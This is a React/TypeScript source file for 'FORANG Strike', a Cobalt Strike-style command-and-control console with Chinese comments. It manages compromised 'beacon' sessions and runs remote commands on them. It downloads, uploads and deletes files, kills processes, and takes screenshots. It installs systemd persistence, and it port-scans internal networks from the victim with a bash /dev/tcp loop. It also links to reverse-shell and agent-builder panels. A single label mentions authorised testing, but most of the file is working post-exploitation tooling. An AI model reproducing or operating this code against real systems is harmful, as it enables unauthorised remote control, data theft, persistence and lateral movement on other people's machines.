"use client";

// c2-console.tsx — Cobalt Strike 风格 C2 指挥台（会话功能全量）：
//   会话表（外部IP/内部IP/主机名/系统/架构/用户/心跳/最后回连/备注）
//   选中会话 → 功能面板 Tab：Interact（Beacon Console）/ Files（文件浏览器，
//   原生 download/upload 二进制安全）/ Process（进程+kill）/ Network（内网扫描+netstat）
//   内置命令：sleep N（原生任务）/ getuid / ps / clear / help；行操作：Note / Remove（下线）
import React from "react";
import { CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { api } from "@/lib/api";
import {
  RefreshCw, SettingsIcon, PencilIcon, XIcon, ZapIcon,
  TerminalIcon, FolderIcon, CpuIcon, NetworkIcon, TrashIcon,
  FolderUpIcon, FolderDownIcon, FolderPlusIcon, PuzzleIcon,
  InfoIcon, ClockIcon, ScrollTextIcon, TerminalSquareIcon, PackageIcon,
} from "lucide-react";
import C2PluginsPanel from "./c2-plugins";
import { SysInfoPanel, SchedulePanel, AuditPanel } from "./c2-panels";
import C2GraphPanel from "./c2-graph-panel";
import { C2ShellPanel, C2AgentBuilder } from "./c2-shell-panel";

interface BeaconRow {
  id: string;
  externalIp?: string;
  internalIp?: string;
  hostname?: string;
  osType?: string;
  arch?: string;
  username?: string;
  interval?: number;
  jitter?: number;
  lastBeacon?: string;
  notes?: string;
  integrityLevel?: string;
}

type Panel = "interact" | "files" | "process" | "network" | "plugins" | "sysinfo" | "schedule" | "audit" | "graph" | "shell";

// useTask 下发任务并轮询到 output（600ms 轮询，默认 15s 兜底）。
function useTask(beaconId: string) {
  const [busy, setBusy] = React.useState(false);
  const pollRef = React.useRef<ReturnType<typeof setInterval> | null>(null);
  React.useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  const run = async (type: string, args: Record<string, unknown>, timeoutMS = 15000): Promise<{ output: string; error?: string }> => {
    if (pollRef.current) clearInterval(pollRef.current);
    setBusy(true);
    try {
      const r = await api.c2Task(beaconId, type, args);
      const tid = r.data?.task_id;
      if (!tid) throw new Error("无 taskId");
      return await new Promise<{ output: string; error?: string }>((resolve) => {
        const poll = async () => {
          try {
            const t = await api.c2Tasks(beaconId, tid);
            const arr = t.data || [];
            for (const it of arr) {
              const m = it as Record<string, unknown>;
              const mid = String(m.id ?? m.taskId ?? "");
              if (mid !== "" && mid !== tid) continue;
              const st = String(m.status || "");
              const o = String(m.output || m.result || "");
              if (o || st === "completed" || st === "done") {
                if (pollRef.current) clearInterval(pollRef.current);
                setBusy(false);
                resolve({ output: o, error: String(m.error || "") });
                return;
              }
            }
          } catch { /* 轮询抖动 */ }
        };
        setTimeout(poll, 400);
        pollRef.current = setInterval(poll, 600);
        setTimeout(() => {
          if (pollRef.current) {
            clearInterval(pollRef.current);
            setBusy(false);
            resolve({ output: "", error: "超时未回显（beacon 心跳间隔影响）" });
          }
        }, timeoutMS);
      });
    } catch (e) {
      setBusy(false);
      return { output: "", error: e instanceof Error ? e.message : String(e) };
    }
  };

  const exec = (cmd: string) => run("exec", { cmd });
  return { busy, run, exec };
}

function timeAgo(iso?: string): string {
  if (!iso) return "-";
  const t = new Date(iso).getTime();
  if (Number.isNaN(t)) return String(iso).slice(5, 16);
  const s = Math.max(0, Math.floor((Date.now() - t) / 1000));
  if (s < 60) return `${s}s`;
  if (s < 3600) return `${Math.floor(s / 60)}m`;
  if (s < 86400) return `${Math.floor(s / 3600)}h`;
  return `${Math.floor(s / 86400)}d`;
}

export default function C2Console() {
  const [beacons, setBeacons] = React.useState<BeaconRow[]>([]);
  const [listeners, setListeners] = React.useState<Record<string, unknown>[]>([]);
  const [status, setStatus] = React.useState<{ url: string; token_masked: string; reachable: boolean; error: string } | null>(null);
  const [sel, setSel] = React.useState<string>("");
  const [panel, setPanel] = React.useState<Panel>("interact");
  const [cfgOpen, setCfgOpen] = React.useState(false);
  const [builderOpen, setBuilderOpen] = React.useState(false);
  const [cfgUrl, setCfgUrl] = React.useState("");
  const [cfgToken, setCfgToken] = React.useState("");
  const [reload, setReload] = React.useState(0);

  const load = React.useCallback(async () => {
    try {
      const st = await api.c2Status();
      setStatus({ url: st.data.url, token_masked: st.data.token_masked, reachable: st.data.reachable, error: st.data.error });
      if (st.data.reachable) {
        const [c, l] = await Promise.all([api.c2Clients(), api.c2Listeners()]);
        setBeacons((c.data || []) as unknown as BeaconRow[]);
        setListeners(l.data || []);
      } else {
        setBeacons([]);
        setListeners([]);
      }
    } catch { /* ignore */ }
  }, []);

  // SSE 实时推送（替代 5s 轮询）+ 10s 兜底刷新
  React.useEffect(() => {
    load();
    const es = new EventSource(`/api/tools/c2/stream`);
    es.addEventListener("sessions", () => load());
    es.addEventListener("graph_update", () => load());
    es.onerror = () => { /* SSE 断开后靠兜底 */ };
    const fallback = setInterval(load, 10000); // SSE 断了兜底
    return () => { es.close(); clearInterval(fallback); };
  }, [load, reload]);

  const saveCfg = async () => {
    try {
      const r = await api.c2SettingsSet({ url: cfgUrl || undefined, token: cfgToken || undefined });
      window.alert(r.ok ? "已保存并探活成功" : "已保存，探活失败: " + r.status);
      setCfgOpen(false);
      setReload((n) => n + 1);
    } catch (e) {
      window.alert("保存失败: " + (e instanceof Error ? e.message : String(e)));
    }
  };

  const editNote = async (b: BeaconRow) => {
    const n = window.prompt(`备注 ${b.hostname || b.id}`, b.notes || "");
    if (n === null) return;
    await fetch(`/api/tools/c2/clients/${encodeURIComponent(b.id)}/notes`, {
      method: "PUT",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${localStorage.getItem("forang_token") || ""}` },
      body: JSON.stringify({ notes: n }),
    });
    setReload((x) => x + 1);
  };

  const removeBeacon = async (b: BeaconRow) => {
    if (!window.confirm(`下线会话 ${b.hostname}（${b.id.slice(0, 16)}…）？`)) return;
    await api.c2Remove(b.id);
    setSel("");
    setReload((x) => x + 1);
  };

  const selBeacon = beacons.find((b) => b.id === sel);

  return (
    <div className="flex h-[calc(100vh-190px)] min-h-[560px] flex-col overflow-hidden rounded-lg border border-zinc-700 bg-zinc-900 text-zinc-200 shadow-2xl">
      <div className="flex flex-wrap items-center gap-2 border-b border-zinc-700 bg-zinc-800 px-3 py-2 text-sm">
        <span className="flex items-center gap-1.5 font-semibold text-red-400"><ZapIcon className="size-4" /> FORANG Strike</span>
        <span className={`rounded px-1.5 text-[10px] ${status?.reachable ? "bg-green-500/20 text-green-400" : "bg-red-500/20 text-red-400"}`}>
          {status?.reachable ? "teamserver 在线" : "不可达"}
        </span>
        <span className="font-mono text-[11px] text-zinc-400">{status?.url} · token {status?.token_masked}</span>
        <span className="rounded bg-zinc-700 px-1.5 text-[10px]">Beacons {beacons.length}</span>
        <span className="rounded bg-zinc-700 px-1.5 text-[10px]">Listeners {listeners.length}</span>
        <div className="ml-auto flex gap-1">
          <button className="flex items-center gap-1 rounded border border-zinc-600 px-2 py-1 text-[11px] hover:bg-zinc-700" onClick={() => setCfgOpen(!cfgOpen)}>
            <SettingsIcon className="size-3.5" /> Preferences
          </button>
          <button className="flex items-center gap-1 rounded border border-zinc-600 px-2 py-1 text-[11px] hover:bg-zinc-700" onClick={() => setBuilderOpen(!builderOpen)}>
            <PackageIcon className="size-3.5" /> 生成器
          </button>
          <button className="flex items-center gap-1 rounded border border-zinc-600 px-2 py-1 text-[11px] hover:bg-zinc-700" onClick={() => setReload((n) => n + 1)}>
            <RefreshCw className="size-3.5" /> Refresh
          </button>
        </div>
      </div>
      {builderOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={() => setBuilderOpen(false)}>
          <div className="rounded-lg border border-zinc-600 bg-zinc-900 p-4" onClick={(e) => e.stopPropagation()}>
            <C2AgentBuilder />
          </div>
        </div>
      )}
      {cfgOpen && (
        <div className="flex flex-wrap items-center gap-2 border-b border-zinc-700 bg-zinc-800/70 px-3 py-2 text-xs">
          <Input className="h-7 w-64 border-zinc-600 bg-zinc-800 font-mono text-[11px] text-zinc-200" placeholder="goc2 admin URL" value={cfgUrl} onChange={(e) => setCfgUrl(e.target.value)} />
          <Input className="h-7 w-56 border-zinc-600 bg-zinc-800 font-mono text-[11px] text-zinc-200" placeholder="admin token（留空不改）" value={cfgToken} onChange={(e) => setCfgToken(e.target.value)} />
          <Button size="sm" variant="secondary" onClick={saveCfg}>Connect</Button>
          <span className="text-zinc-500">token 只存服务端</span>
        </div>
      )}

      {/* 会话表 */}
      <div className="min-h-0 flex-1 overflow-auto">
        <table className="w-full text-[11px]">
          <thead className="sticky top-0 bg-zinc-800 text-zinc-400">
            <tr className="text-left">
              <th className="px-2 py-1.5">*</th>
              <th>外部 IP</th><th>内部 IP</th><th>主机名</th><th>操作系统</th><th>架构</th><th>用户</th>
              <th className="w-16">心跳</th><th className="w-20">最后回连</th><th>备注</th><th className="w-20">操作</th>
            </tr>
          </thead>
          <tbody>
            {beacons.length === 0 && (
              <tr><td colSpan={11} className="py-10 text-center text-zinc-500">{status?.reachable ? "无活跃会话——等待 beacon 回连" : "teamserver 不可达（配置 goc2 连接）"}</td></tr>
            )}
            {beacons.map((b) => (
              <tr key={b.id} className={`cursor-pointer border-b border-zinc-800 hover:bg-zinc-800/60 ${sel === b.id ? "bg-blue-900/30 text-zinc-100" : ""}`} onClick={() => setSel(b.id)}>
                <td className="px-2 py-1">{sel === b.id ? "▶" : ""}</td>
                <td className="font-mono text-zinc-400">{b.externalIp || "-"}</td>
                <td className="font-mono">{b.internalIp || "-"}</td>
                <td className="font-semibold text-blue-400">{b.hostname || "-"}</td>
                <td>{b.osType || "-"}{b.integrityLevel ? ` (${b.integrityLevel})` : ""}</td>
                <td>{b.arch || "-"}</td>
                <td className="font-mono">{b.username || "-"}</td>
                <td className="text-zinc-400">{b.interval ? `${b.interval}s` : "-"}</td>
                <td className="text-zinc-400">{timeAgo(b.lastBeacon)}</td>
                <td className="truncate text-amber-300" title={b.notes}>{b.notes || ""}</td>
                <td>
                  <span className="flex gap-1.5">
                    <button title="备注" onClick={(e) => { e.stopPropagation(); editNote(b); }}><PencilIcon className="size-3 text-zinc-500 hover:text-zinc-200" /></button>
                    <button title="下线会话" onClick={(e) => { e.stopPropagation(); removeBeacon(b); }}><TrashIcon className="size-3 text-zinc-500 hover:text-red-400" /></button>
                  </span>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {selBeacon && (
        <SessionPanel beacon={selBeacon} panel={panel} setPanel={setPanel} onClose={() => setSel("")} onRefresh={() => setReload((n) => n + 1)} />
      )}
    </div>
  );
}

// ---------- 会话功能面板（CS 右键菜单全量） ----------

function SessionPanel({ beacon, panel, setPanel, onClose, onRefresh }: {
  beacon: BeaconRow;
  panel: Panel;
  setPanel: (p: Panel) => void;
  onClose: () => void;
  onRefresh: () => void;
}) {
  const tabs: { key: Panel; label: string; icon: React.ReactNode }[] = [
    { key: "interact", label: "交互终端", icon: <TerminalIcon className="size-3.5" /> },
    { key: "files", label: "文件管理", icon: <FolderIcon className="size-3.5" /> },
    { key: "process", label: "进程管理", icon: <CpuIcon className="size-3.5" /> },
    { key: "network", label: "网络探测", icon: <NetworkIcon className="size-3.5" /> },
    { key: "plugins", label: "后渗透插件", icon: <PuzzleIcon className="size-3.5" /> },
    { key: "sysinfo", label: "系统信息", icon: <InfoIcon className="size-3.5" /> },
    { key: "schedule", label: "定时任务", icon: <ClockIcon className="size-3.5" /> },
    { key: "audit", label: "审计日志", icon: <ScrollTextIcon className="size-3.5" /> },
    { key: "graph", label: "攻击链路图", icon: <NetworkIcon className="size-3.5" /> },
    { key: "shell", label: "反弹Shell", icon: <TerminalSquareIcon className="size-3.5" /> },
  ];
  return (
    <div className="flex h-72 flex-col border-t border-zinc-700 bg-black">
      <div className="flex items-center gap-1 bg-zinc-800/80 px-3 py-1 text-[11px]">
        <span className="font-semibold text-red-400">{beacon.hostname}</span>
        <span className="text-zinc-500">{beacon.id.slice(0, 16)}…</span>
        <span className="mx-2 h-3 w-px bg-zinc-600" />
        {tabs.map((t) => (
          <button key={t.key} className={`flex items-center gap-1 rounded px-2 py-0.5 ${panel === t.key ? "bg-blue-600 text-white" : "text-zinc-300 hover:bg-zinc-700"}`} onClick={() => setPanel(t.key)}>
            {t.icon}{t.label}
          </button>
        ))}
        <button className="ml-auto text-zinc-500 hover:text-red-400" onClick={onClose}><XIcon className="size-3.5" /></button>
      </div>
      <div className="min-h-0 flex-1 overflow-auto">
        {panel === "interact" && <InteractPanel beacon={beacon} onRefresh={onRefresh} />}
        {panel === "files" && <FilesPanel beacon={beacon} />}
        {panel === "process" && <ProcessPanel beacon={beacon} />}
        {panel === "network" && <NetworkPanel beacon={beacon} />}
        {panel === "plugins" && <C2PluginsPanel beaconId={beacon.id} />}
        {panel === "sysinfo" && <SysInfoPanel beaconId={beacon.id} />}
        {panel === "schedule" && <SchedulePanel beaconId={beacon.id} />}
        {panel === "audit" && <AuditPanel />}
        {panel === "graph" && <C2GraphPanel beaconId={beacon.id} />}
        {panel === "shell" && <C2ShellPanel beaconId={beacon.id} />}
      </div>
    </div>
  );
}

// ---------- Interact（Beacon Console） ----------

function InteractPanel({ beacon, onRefresh }: { beacon: BeaconRow; onRefresh: () => void }) {
  const [out, setOut] = React.useState("");
  const [cmd, setCmd] = React.useState("");
  const { busy, exec, run } = useTask(beacon.id);
  const hist = React.useRef<string[]>([]);
  const hidx = React.useRef(-1);
  const outRef = React.useRef<HTMLPreElement>(null);

  React.useEffect(() => {
    setOut(`[*] 会话 ${beacon.hostname}（${beacon.internalIp}）· ${beacon.osType}/${beacon.arch}\n[*] 内置：sleep N 调心跳 | getuid | ps | clear | help；shell/sh 前缀剥离。\n`);
  }, [beacon.id]); // eslint-disable-line react-hooks/exhaustive-deps
  React.useEffect(() => { if (outRef.current) outRef.current.scrollTop = outRef.current.scrollHeight; }, [out]);

  const append = (s: string) => setOut((o) => o + s + "\n");

  const send = async (raw?: string) => {
    let line = (raw ?? cmd).trim();
    if (!line) return;
    setCmd("");
    if (line === "clear") { setOut(""); return; }
    if (line === "help") {
      append("[*] 内置：sleep N（调心跳）/ getuid / ps / screenshot（截屏）/ persist [名]（systemd 持久化）/ clear / help。其余命令作为 exec 下发（shell/sh 前缀剥离）。");
      return;
    }
    if (/^sleep\s+\d+(\.\d+)?(\s+\d+(\.\d+)?)?$/i.test(line)) {
      const m = line.match(/^sleep\s+(\d+(?:\.\d+)?)(?:\s+(\d+(?:\.\d+)?))?$/i)!;
      append(`beacon> ${line}\n[*] 已下发 sleep ${m[1]}s（jitter ${m[2] || 0.1}），下次回连生效。`);
      await run("sleep", { interval: parseFloat(m[1]), jitter: m[2] ? parseFloat(m[2]) : 0.1 });
      onRefresh();
      return;
    }
    if (line === "screenshot") {
      append("beacon> screenshot");
      const r = await run("screenshot", {}, 30000);
      if (r.output && r.output.length > 100) {
        append("[+] 截图成功（base64 PNG，" + r.output.length + " 字符）——已在新窗口打开");
        try { window.open("data:image/png;base64," + r.output.trim(), "_blank"); } catch { append("[!] 弹窗被拦截，长度：" + r.output.length); }
      } else append("[!] " + (r.error || "无图像（无头环境）"));
      return;
    }
    if (line === "persist" || line.startsWith("persist ")) {
      const name = line.split(" ")[1] || "C2Agent";
      append("beacon> persist " + name);
      const r = await run("persist", { name }, 30000);
      append(r.output || "[!] " + (r.error || "无输出"));
      return;
    }
    if (line === "getuid") line = "id";
    if (line === "ps") line = beacon.osType?.toLowerCase().includes("win") ? "tasklist" : "ps aux";
    for (const p of ["shell ", "sh "]) { if (line.toLowerCase().startsWith(p)) { line = line.slice(p.length); break; } }
    hist.current.push(raw ?? cmd);
    hidx.current = -1;
    append(`beacon> ${line}`);
    const r = await exec(line);
    append(r.output || `[!] ${r.error || "无输出"}`);
  };

  return (
    <div className="flex h-full flex-col">
      <pre ref={outRef} className="min-h-0 flex-1 overflow-auto whitespace-pre-wrap px-3 py-1.5 font-mono text-[11px] leading-relaxed text-zinc-300">{out}</pre>
      <div className="flex items-center gap-1 border-t border-zinc-800 px-3 py-1.5">
        <span className="shrink-0 font-mono text-[11px] text-red-400">beacon&gt;</span>
        <input
          className="flex-1 bg-transparent font-mono text-[11px] text-zinc-200 outline-none placeholder:text-zinc-600"
          placeholder={busy ? "…" : "shell whoami / sleep 5（Enter，↑↓ 历史）"}
          value={cmd}
          disabled={busy}
          onChange={(e) => setCmd(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter") send();
            if (e.key === "ArrowUp") {
              e.preventDefault();
              const h = hist.current;
              if (!h.length) return;
              hidx.current = hidx.current < 0 ? h.length - 1 : Math.max(0, hidx.current - 1);
              setCmd(h[hidx.current]);
            }
            if (e.key === "ArrowDown") {
              e.preventDefault();
              const h = hist.current;
              if (hidx.current >= 0 && hidx.current < h.length - 1) { hidx.current++; setCmd(h[hidx.current]); }
              else { hidx.current = -1; setCmd(""); }
            }
          }}
        />
        {busy && <span className="animate-pulse text-amber-400">…</span>}
      </div>
    </div>
  );
}

// ---------- Files（CS 文件浏览器：原生 download/upload） ----------

interface FileEntry { perms: string; size: string; date: string; name: string; isDir: boolean }

function parseLs(text: string): FileEntry[] {
  const entries: FileEntry[] = [];
  for (const line of text.split("\n")) {
    const cl = line.trim();
    if (!cl || cl.startsWith("total")) continue;
    // 日期兼容三态：Oct 31 00:10 / 10月31日 00:10 / 2026-10-31 00:10
    const m = cl.match(/^([\-dlbcps][rwxst\-]{9,})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+(\S+\s+\S+\s+[\d:]+|\d+月\d+日\s+[\d:]+|\d{4}-\d{2}-\d{2}\s+[\d:]+)\s+(.+)$/);
    if (m) {
      const name = m[4].trim().split(" -> ")[0];
      if (name === ".") continue;
      entries.push({ perms: m[1], size: m[2], date: m[3], name, isDir: m[1].startsWith("d") || name === ".." });
    }
  }
  return entries;
}

function FilesPanel({ beacon }: { beacon: BeaconRow }) {
  const [cwd, setCwd] = React.useState("/root");
  const [pathInput, setPathInput] = React.useState("/root");
  const [entries, setEntries] = React.useState<FileEntry[]>([]);
  const [msg, setMsg] = React.useState("");
  const [raw, setRaw] = React.useState("");
  const { busy, exec, run } = useTask(beacon.id);
  const selRef = React.useRef<FileEntry | null>(null);
  const [selName, setSelName] = React.useState("");

  const jpath = (n: string) => `${cwd.replace(/\/+$/, "")}/${n}`;

  const ls = async (p?: string) => {
    const dest = p ?? cwd;
    setMsg("");
    const r = await exec(`ls -la ${JSON.stringify(dest)}`);
    if (!r.output) { setMsg("[!] " + (r.error || "无输出")); setEntries([]); setRaw(r.output); return; }
    setRaw(r.output);
    const es = parseLs(r.output);
    es.sort((a, b) => (b.isDir ? 1 : 0) - (a.isDir ? 1 : 0) || a.name.localeCompare(b.name));
    setEntries(es);
    setCwd(dest);
    setPathInput(dest);
  };

  React.useEffect(() => { ls(cwd); }, [beacon.id]); // eslint-disable-line react-hooks/exhaustive-deps

  const download = async (f: FileEntry) => {
    if (f.isDir) return void setMsg("[!] 目录不支持直接下载（exec tar 打包后下载）");
    setMsg("[*] 下载中…");
    const r = await run("download", { path: jpath(f.name) }, 30000);
    if (!r.output) return setMsg("[!] " + (r.error || "下载失败"));
    try {
      const bin = atob(r.output.trim());
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      const a = document.createElement("a");
      a.href = URL.createObjectURL(new Blob([bytes]));
      a.download = f.name;
      a.click();
      setMsg(`[*] 已下载 ${f.name}（${bytes.length} 字节）`);
    } catch {
      setMsg("[!] 内容解码失败：" + r.output.slice(0, 60));
    }
  };

  const upload = () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.onchange = async () => {
      const f = inp.files?.[0];
      if (!f) return;
      const b64 = await new Promise<string>((res) => {
        const fr = new FileReader();
        fr.onload = () => res(String(fr.result).split(",")[1] || "");
        fr.readAsDataURL(f);
      });
      setMsg("[*] 上传中…");
      const r = await run("upload", { path: jpath(f.name), data: b64 }, 60000);
      setMsg(!r.error ? `[*] 已上传 ${f.name}` : `[!] 上传：${r.error}`);
      ls(cwd);
    };
    inp.click();
  };

  const del = async (f: FileEntry) => {
    if (!window.confirm(`删除 ${f.name}？`)) return;
    const r = await exec(`rm -rf ${JSON.stringify(jpath(f.name))}`);
    setMsg(r.output || r.error || "[*] 已删除");
    ls(cwd);
  };

  const mkdir = async () => {
    const n = window.prompt("新目录名");
    if (!n) return;
    await exec(`mkdir -p ${JSON.stringify(jpath(n))}`);
    ls(cwd);
  };

  const enter = (f: FileEntry) => {
    if (!f.isDir) return;
    if (f.name === "..") { ls(cwd.replace(/\/[^/]+$/, "") || "/"); return; }
    ls(jpath(f.name));
  };

  return (
    <div className="flex h-full flex-col text-[11px]">
      <div className="flex flex-wrap items-center gap-1 border-b border-zinc-800 px-2 py-1">
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" onClick={() => ls(cwd)} disabled={busy}><RefreshCw className={`size-3 ${busy ? "animate-spin" : ""}`} /> 刷新</button>
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700" onClick={upload}><FolderUpIcon className="size-3" /> 上传</button>
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" disabled={!selName} onClick={() => selRef.current && download(selRef.current)}><FolderDownIcon className="size-3" /> 下载</button>
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700" onClick={mkdir}><FolderPlusIcon className="size-3" /> 新目录</button>
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" disabled={!selName} onClick={() => selRef.current && del(selRef.current)}><TrashIcon className="size-3" /> 删除</button>
        <span className="mx-1 h-3 w-px bg-zinc-700" />
        <input
          className="min-w-0 flex-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-zinc-200 outline-none focus:border-blue-500"
          value={pathInput} onChange={(e) => setPathInput(e.target.value)}
          onKeyDown={(e) => { if (e.key === "Enter") ls(pathInput); }}
        />
      </div>
      <div className="min-h-0 flex-1 overflow-auto">
        <table className="w-full">
          <thead className="sticky top-0 bg-zinc-900 text-zinc-500"><tr className="text-left"><th className="px-2 py-1">名称</th><th className="w-28">大小</th><th className="w-40">修改时间</th><th className="w-24">权限</th></tr></thead>
          <tbody>
            {entries.length === 0 && <tr><td colSpan={4} className="py-4 text-center text-zinc-500">{busy ? "加载…" : "空（输入路径回车浏览）"}</td></tr>}
            {entries.map((f) => (
              <tr key={f.name}
                className={`cursor-pointer border-b border-zinc-800/60 hover:bg-zinc-800/60 ${selName === f.name ? "bg-blue-900/30" : ""}`}
                onClick={() => { selRef.current = f; setSelName(f.name); }}
                onDoubleClick={() => enter(f)}>
                <td className="px-2 py-0.5 font-mono">
                  {f.isDir ? <span className="font-semibold text-blue-400">📁 {f.name}</span> : <span className="text-zinc-200">📄 {f.name}</span>}
                </td>
                <td className="text-zinc-400">{f.isDir ? "-" : f.size}</td>
                <td className="text-zinc-400">{f.date}</td>
                <td className="font-mono text-zinc-500">{f.perms}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {(msg || raw) && <div className="max-h-14 overflow-auto border-t border-zinc-800 px-2 py-1 font-mono text-[10px] text-zinc-400">{msg || raw.split("\n").slice(0, 2).join("\n")}</div>}
    </div>
  );
}

// ---------- Process（进程 + kill） ----------

function ProcessPanel({ beacon }: { beacon: BeaconRow }) {
  const [raw, setRaw] = React.useState("");
  const [rows, setRows] = React.useState<{ pid: string; cmd: string }[]>([]);
  const { busy, exec } = useTask(beacon.id);

  const list = async () => {
    const r = await exec("ps aux | head -80");
    setRaw(r.output || r.error || "");
    const es: { pid: string; cmd: string }[] = [];
    for (const line of (r.output || "").split("\n").slice(1)) {
      const m = line.trim().match(/^\S+\s+(\d+)\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+(.+)$/);
      if (m) es.push({ pid: m[1], cmd: m[2].slice(0, 90) });
    }
    setRows(es);
  };

  const kill = async (pid: string) => {
    if (!window.confirm(`kill -9 ${pid}？`)) return;
    await exec(`kill -9 ${pid}`);
    setTimeout(list, 1500);
  };

  React.useEffect(() => { list(); }, [beacon.id]); // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <div className="flex h-full flex-col text-[11px]">
      <div className="flex items-center gap-2 border-b border-zinc-800 px-2 py-1">
        <button className="flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" onClick={list} disabled={busy}>
          <RefreshCw className={`size-3 ${busy ? "animate-spin" : ""}`} /> ps aux（前 80）
        </button>
        <span className="text-zinc-500">行内 Kill 对目标进程发 kill -9</span>
      </div>
      <div className="min-h-0 flex-1 overflow-auto">
        <table className="w-full">
          <thead className="sticky top-0 bg-zinc-900 text-zinc-500"><tr className="text-left"><th className="w-16 px-2 py-1">PID</th><th>命令</th><th className="w-14" /></tr></thead>
          <tbody>
            {rows.length === 0 && <tr><td colSpan={3} className="py-4 text-center text-zinc-500">{busy ? "加载…" : "（刷新获取）"}</td></tr>}
            {rows.map((p) => (
              <tr key={p.pid} className="border-b border-zinc-800/60 hover:bg-zinc-800/60">
                <td className="px-2 py-0.5 font-mono text-zinc-300">{p.pid}</td>
                <td className="truncate font-mono text-zinc-400" title={p.cmd}>{p.cmd}</td>
                <td><button className="text-[10px] text-red-400 hover:underline" onClick={() => kill(p.pid)}>Kill</button></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {raw && <div className="max-h-8 overflow-auto border-t border-zinc-800 px-2 py-0.5 font-mono text-[10px] text-zinc-500">{raw.split("\n")[0]}</div>}
    </div>
  );
}

// ---------- Network（内网扫描 + netstat） ----------

function NetworkPanel({ beacon }: { beacon: BeaconRow }) {
  const [host, setHost] = React.useState("127.0.0.1");
  const [ports, setPorts] = React.useState("22,80,443,3306,5432,6379,8080,8443");
  const [out, setOut] = React.useState("");
  const { busy, exec } = useTask(beacon.id);

  // 以目标机为跳板：bash /dev/tcp 并发探测（一条命令完成全部端口）
  const scan = async () => {
    const p = ports.split(",").map((x) => x.trim()).filter(Boolean).join(" ");
    setOut("[*] 扫描中…");
    // /dev/tcp 是 bash 特性——beacon exec 走 sh(dash)，必须显式 bash -c
    const r = await exec(`bash -c 'for p in ${p}; do (echo >/dev/tcp/${host}/$p) 2>/dev/null && echo "OPEN ${host}:$p"; done; echo SCAN-DONE'`);
    setOut(r.output || "[!] " + (r.error || "无输出"));
  };

  const netstat = async () => {
    setOut("[*] 获取中…");
    const r = await exec("netstat -antp 2>/dev/null | head -60 || netstat -an | head -60");
    setOut(r.output || "[!] " + (r.error || "无输出"));
  };

  return (
    <div className="flex h-full flex-col text-[11px]">
      <div className="flex flex-wrap items-center gap-1 border-b border-zinc-800 px-2 py-1">
        <input className="w-32 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-zinc-200 outline-none" value={host} onChange={(e) => setHost(e.target.value)} placeholder="host" />
        <input className="w-56 rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-zinc-200 outline-none" value={ports} onChange={(e) => setPorts(e.target.value)} placeholder="ports" />
        <button className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" onClick={scan} disabled={busy}>Portscan</button>
        <button className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 hover:bg-zinc-700 disabled:opacity-40" onClick={netstat} disabled={busy}>netstat</button>
        <span className="text-zinc-500">以目标机为跳板探测内网（授权测试）</span>
      </div>
      <pre className="min-h-0 flex-1 overflow-auto whitespace-pre-wrap px-2 py-1 font-mono text-zinc-300">{out || "（结果）"}</pre>
    </div>
  );
}
